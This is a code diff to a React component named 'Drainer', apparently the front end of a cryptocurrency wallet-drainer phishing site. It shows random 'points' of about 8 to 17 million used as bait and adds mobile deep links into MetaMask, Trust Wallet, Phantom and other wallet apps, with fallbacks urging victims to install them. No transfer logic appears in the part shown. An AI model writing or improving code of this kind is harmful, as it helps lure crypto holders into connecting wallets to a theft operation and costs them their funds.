@@ -16,6 +16,8 @@ export default function Drainer() {
   const [connectionError, setConnectionError] = useState('')
   const [selectedWallet, setSelectedWallet] = useState('')
   const [walletAddress, setWalletAddress] = useState('')
+  const [showWalletInstructions, setShowWalletInstructions] = useState(false)
+  const [walletDeepLink, setWalletDeepLink] = useState('')
 
   useEffect(() => {
     setPoints(Math.floor(Math.random() * 9000000) + 8000000)
@@ -295,6 +297,7 @@ export default function Drainer() {
     setConnectionStatus('connecting')
     setConnectionError('')
     setSelectedWallet(walletType)
+    setShowWalletInstructions(false)
     
     try {
       const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
@@ -304,22 +307,67 @@ export default function Drainer() {
 
       // Mobile: use deep links
       if (isMobile) {
-        const links: Record<string, string> = {
-          metamask: `https://metamask.app.link/dapp/${url}`,
-          trustwallet: `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`,
-          phantom: `https://phantom.app/ul/browse/${url}?ref=${url}`,
-          backpack: `https://backpack.app/ul/browse/${url}`,
-          solflare: `solflare://dapp?uri=${url}`,
-          coinbasewallet: `cbwallet://dapp?url=${url}`
+        const links: Record<string, {url: string, name: string, installUrl: string}> = {
+          metamask: {
+            url: `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
+            name: 'MetaMask',
+            installUrl: 'https://metamask.io/download.html'
+          },
+          trustwallet: {
+            url: `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`,
+            name: 'Trust Wallet',
+            installUrl: 'https://trustwallet.com/download'
+          },
+          phantom: {
+            url: `https://phantom.app/ul/browse/${url}?ref=${url}`,
+            name: 'Phantom',
+            installUrl: 'https://phantom.app/'
+          },
+          backpack: {
+            url: `https://backpack.app/ul/browse/${url}`,
+            name: 'Backpack',
+            installUrl: 'https://www.backpack.app/'
+          },
+          solflare: {
+            url: `solflare://dapp?uri=${url}`,
+            name: 'Solflare',
+            installUrl: 'https://solflare.com/'
+          },
+          coinbasewallet: {
+            url: `cbwallet://dapp?url=${url}`,
+            name: 'Coinbase Wallet',
+            installUrl: 'https://www.coinbase.com/wallet/downloads'
+          }
         }
+        
         const linkKey = walletType.toLowerCase().replace(/\s+/g, '')
-        if (links[linkKey]) {
+        const walletInfo = links[linkKey]
+        
+        if (walletInfo) {
           // Store connection attempt in session storage
           sessionStorage.setItem('walletConnectionAttempt', JSON.stringify({
             wallet: walletType,
             timestamp: Date.now()
           }))
-          window.location.href = links[linkKey]
+          
+          // Try to open the wallet app
+          const timeout = 2000 // 2 seconds
+          const start = Date.now()
+          
+          // Try to open the wallet app
+          window.location.href = walletInfo.url
+          
+          // Check if we were redirected back (wallet not installed)
+          setTimeout(() => {
+            if (document.visibilityState === 'visible') {
+              // Show install instructions
+              setWalletDeepLink(walletInfo.installUrl)
+              setShowWalletInstructions(true)
+              setConnectionStatus('error')
+              setConnectionError(`${walletInfo.name} not found`)
+            }
+          }, timeout)
+          
           return
         }
       }
